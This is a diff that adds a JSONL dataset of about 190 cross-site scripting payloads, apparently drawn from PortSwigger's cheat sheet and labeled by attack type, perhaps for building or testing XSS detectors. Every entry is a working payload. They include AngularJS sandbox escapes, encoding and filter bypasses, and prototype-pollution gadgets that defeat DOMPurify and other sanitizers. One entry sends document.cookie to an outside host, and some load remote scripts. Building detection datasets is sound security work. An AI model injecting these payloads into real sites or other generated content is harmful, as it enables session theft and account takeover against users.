@@ -1,0 +1,1161 @@
+{"payload": "{{constructor.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{$on.constructor('alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{{}.\")));alert(1)//\"}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{!ready && (ready = true) && (\n!call\n? $$watchers[0].get(toString.constructor.prototype)\n: (a = apply) &&\n(apply = constructor) &&\n(valueOf = call) &&\n(''+''.toString(\n'F = Function.prototype;' +\n'F.apply = F.a;' +\n'delete F.a;' +\n'delete F.valueOf;' +\n'alert(1);'\n)));}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};\");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "constructor.constructor('alert(1)')()", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{}.\")));alert(1)//\";", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src=\"javascript:alert(1)\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<body background=\"javascript:alert(1)\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<iframe src=\"data:text/html,<img src=1 onerror=alert(document.domain)>\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"vbscript:MsgBox+1\">XSS</a>\n<a href=\"#\" onclick=\"vbs:Msgbox+1\">XSS</a>\n<a href=\"#\" onclick=\"VBS:Msgbox+1\">XSS</a>\n<a href=\"#\" onclick=\"vbscript:Msgbox+1\">XSS</a>\n<a href=\"#\" onclick=\"VBSCRIPT:Msgbox+1\">XSS</a>\n<a href=\"#\" language=vbs onclick=\"vbscript:Msgbox+1\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"#\" onclick=\"jscript.compact:alert(1);\">test</a>\n<a href=\"#\" onclick=\"JSCRIPT.COMPACT:alert(1);\">test</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=# language=\"JScript.Encode\" onclick=\"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>\n<a href=# onclick=\"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a title=\"&{alert(1)}\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=\"supersecret\"</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<div style=xss:expression(alert(1))>\n<div style=xss:expression(1)-alert(1)>\n<div style=xss:expressio\\6e(alert(1))>\n<div style=xss:expressio\\006e(alert(1))>\n<div style=xss:expressio\\00006e(alert(1))>\n<div style=xss:expressio\\6e(alert(1))>\n<div style=xss:expressio&#x5c;6e(alert(1))>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<div style=xss=expression(alert(1))>\n<div style=\"color&#x3dred\">test</div>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nfunction window.onload(){\nalert(1);\n}\n</script>\n<script>\nfunction window::onload(){\nalert(1);\n}\n</script>\n<script>\nfunction window.location(){\n}\n</script>\n<body>\n<script>\nfunction/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}\n</script>\n</body>\n<body>\n<script>\nfunction document.body.innerHTML(){ x = \"<img src=1 onerror=alert(1)>\"; }\n</script>\n</body>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> </BODY></HTML>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javascript&\u0000#x6a;avascript:alert(1)\">Firefox</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javascript&\u0000colon\u0000;alert(1)\">Firefox</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<!-\u0000- ><img title=\"--><iframe/onload=alert(1)>\"> -->\n<!-\u0000\u0000\u0000\u0000\u0000- ><img title=\"--><iframe/onload=alert(1)>\"> -->", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><xss onload=alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<isindex type=submit formaction=javascript:alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<isindex type=submit action=javascript:alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><discard onbegin=alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src=validimage.png onloadstart=alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<input type=image onloadend=alert(1) src=validimage.png>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>location.protocol='javascript'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"%0aalert(1)\" onclick=\"protocol='javascript'\">test</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x\" /></svg>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><use href=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" />", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javascript://%0aalert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<base href=\"javascript:/a/-alert(1)///////\"><a href=../lol/safari.html>test</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<object data=\"javascript:alert(1)\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<embed src=\"javascript:alert(1)\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<object data=# codebase=javascript:alert(document.domain)//>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<embed src=# codebase=javascript:alert(document.domain)//>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<object data=\"#\nalert(1)\" codebase=javascript://>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<object data=\"#!\nalert(1)\" codebase=javascript:>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<embed src=\"#\nalert(1)\" codebase=javascript://>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<embed src=\"#!\nalert(1)\" codebase=javascript:>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=\"throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<body onload=\"throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x onbeforescriptexecute=alert(1)><script>1</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x onafterscriptexecute=alert(1)><script>1</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<noembed><img title=\"</noembed><img src onerror=alert(1)>\"></noembed>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<noscript><img title=\"</noscript><img src onerror=alert(1)>\"></noscript>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<style><img title=\"</style><img src onerror=alert(1)>\"></style>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script><img title=\"</script><img src onerror=alert(1)>\"></script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<iframe><img title=\"</iframe><img src onerror=alert(1)>\"></iframe>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<xmp><img title=\"</xmp><img src onerror=alert(1)>\"></xmp>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<textarea><img title=\"</textarea><img src onerror=alert(1)>\"></textarea>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<noframes><img title=\"</noframes><img src onerror=alert(1)>\"></noframes>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<title><img title=\"</title><img src onerror=alert(1)>\"></title>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>alert(document.domain)</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src=\"//evil?\n<image src=\"//evil?", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "%C0%BCscript>alert(1)</script>\n%E0%80%BCscript>alert(1)</script>\n%F0%80%80%BCscript>alert(1)</script>\n%F8%80%80%80%BCscript>alert(1)</script>\n%FC%80%80%80%80%BCscript>alert(1)</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\\u0061lert(1)</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\\u{61}lert(1)</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\\u{0000000061}lert(1)</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>eval('\\x61lert(1)')</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>eval('\\141lert(1)')</script>\n<script>eval('alert(\\061)')</script>\n<script>eval('alert(\\61)')</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"&#106;avascript:alert(1)\">XSS</a><a href=\"&#106avascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><script>&#97;lert(1)</script></svg>\n<svg><script>&#x61;lert(1)</script></svg>\n<svg><script>alert&NewLine;(1)</script></svg>\n<svg><script>x=\"&quot;,alert(1)//\";</script></svg>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"&#0000106avascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"&#x6a;avascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"j&#x61vascript:alert(1)\">XSS</a>\n<a href=\"&#x6a\navascript:alert(1)\">XSS</a>\n<a href=\"&#x6a avascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"&#x0000006a;avascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"&#X6A;avascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javascript&colon;alert(1)\">XSS</a>\n<a href=\"java&Tab;script:alert(1)\">XSS</a>\n<a href=\"java&NewLine;script:alert(1)\">XSS</a>\n<a href=\"javascript&colon;alert&lpar;1&rpar;\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javascript:x='%27-alert(1)-%27';\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javascript:x='&percnt;27-alert(1)-%27';\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<input type=\"file\" id=\"fileInput\" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<xss class=progress-bar-animated onanimationstart=alert(1)>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>eval(myUndefVar);var inject=\"INJECTION_STARTS_HERE\";var myUndefVar;alert(1);//\";</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>myUndefFunction(13,37);var inject=\"INJECTION_STARTS_HERE\";function myUndefFunction(){};alert(1);//\";</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>var myUndefObject = new myUndefClass();var inject=\"INJECTION_STARTS_HERE\";function myUndefClass(){};alert(1);//\";</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>$(document).ready(function(){var inject=\"INJECTION_STARTS_HERE\";});function $(){return{ready:()=>0}};alert(1);(function(){\"\";});</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>undef01.undef02(\"INJECTION\"+alert(1));function undef01(){}//\");</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script type=\"module\">undef01.undef02.undef03.undef04.undef05();var inject = \"INJECTION\";import \"data:text/jscript,alert(1)\"//\";</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>var x=atob(\"dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh\");undef01.undef02();var inject = \"INJECTION\";function atob(){alert(1);}//\";</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<iframe src=\"javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'\"></iframe>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\"\n onmouseover=/*&lt;svg/*/onload=alert()//>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/\"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<iframe src=\"javascript:alert(1)\">", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"JaVaScript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\" \tjavascript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javas\tcript:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<a href=\"javascript\n:alert(1)\">XSS</a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script src=\"data:text/javascript,alert(1)\"></script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><script href=\"data:text/javascript,alert(1)\" />", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>import('data:text/javascript,alert(1)')</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<math><x href=\"javascript:alert(1)\">blah", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form><button formaction=javascript:alert(1)>XSS", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form><input type=submit formaction=javascript:alert(1) value=XSS>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<form action=javascript:alert(1)><input type=submit value=XSS>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>navigation.navigate('javascript:alert(1)')</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.innerHTML = '<img/src/onerror=alert(1)>';\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.preventDefault='x';\nObject.prototype.handleObj='x';\nObject.prototype.delegateTarget='<img/src/onerror=alert(1)>';\n/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.div=['1','<img src onerror=alert(1)>','1']\n</script><script>\n$('<div x=\"x\"></div>')\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.url = ['data:,alert(1)//'];\nObject.prototype.dataType = 'script';\n</script>\n<script>\n$.get('https://google.com/');\n$.post('https://google.com/');\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.src = ['data:,alert(1)//']\n</script>\n<script>\n$.getScript('https://google.com/')\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.url = 'data:,alert(1)//'\n</script>\n<script>\n$.getScript('https://google.com/')\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.srcdoc=['<script>alert(1)<\\/script>']\n</script>\n<div class=\"g-recaptcha\" data-sitekey=\"your-site-key\"/>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.hif = ['javascript:alert(document.domain)'];\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.attrs = {src:1};\nObject.prototype.src='https://portswigger-labs.net/xss/xss.js'\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>Object.prototype.BOOMR = 1;\nObject.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.sourceURL = '\\u2028\\u2029alert(1)'\n</script>\n<script>\n_.template('test')\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype['*'] = ['onload']</script>\n<script>\ndocument.write(sanitizeHtml('<iframe onload=alert(1)>'))\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.whiteList = {img: ['onerror', 'src']}\n</script>\n<script>\ndocument.write(filterXSS('<img src onerror=alert(1)>'))\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.ALLOWED_ATTR = ['onerror', 'src']\n</script>\n<script>\ndocument.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.documentMode = 9\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nconst html = '<img src onerror=alert(1)>';\nconst sanitizer = new goog.html.sanitizer.HtmlSanitizer();\nconst sanitized = sanitizer.sanitize(html);\nconst node = goog.dom.safeHtmlToNode(sanitized);\n\ndocument.body.append(node);\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.tagName = 'img'\nObject.prototype.src = ['x:x']\nObject.prototype.onerror = ['alert(1)']\n</script>\n<script>\n(function() {\nvar View = Mn.View.extend({template: '#template-layout'});\nvar App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});\nvar app = new App();\napp.start();\n})();\n</script>\n<div id=\"template-layout\" type=\"x-template/underscore\">xxx</div>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.src='data:,alert(1)//'\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.onload = 'alert(1)'\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<strong data-bind=\"text:'hello'\"></strong>\n<script>\nObject.prototype[4]=\"a':1,[alert(1)]:1,'b\";Object.prototype[5]=',';\n</script><script>\nko.applyBindings({})\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>\nObject.prototype.on = 'click';\n$('body').on('click', function() { alert('Injected Event'); });\n$('body').trigger('click');\n</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>onerror=alert;throw 1</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>{onerror=alert}throw 1</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=alert,1</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=eval,'=alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=eval,'alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\\x281\\x29'}</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=eval,e=new Error,e.message='alert\\x281\\x29',e</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>location='javascript:alert\\x281\\x29'</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>location=name</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>alert`1`</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>new Function`X${document.location.hash.substr`1`}`</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>Function`X${document.location.hash.substr`1`}```</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<video><source onerror=location=/\\02.rs/+document.cookie>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=alert(1)", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<svg onload=alert(1)<!--", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>throw[onerror]=[alert],1</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>var{a:onerror}={a:alert};throw 1</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>var{haha:onerror=alert}=0;throw 1</script>", "attack_type": "XSS", "source": "portswigger"}
+{"payload": "<script>window.name='javascript:alert(1)';</script><svg onload=location=name>", "attack_type": "XSS", "source": "portswigger"}
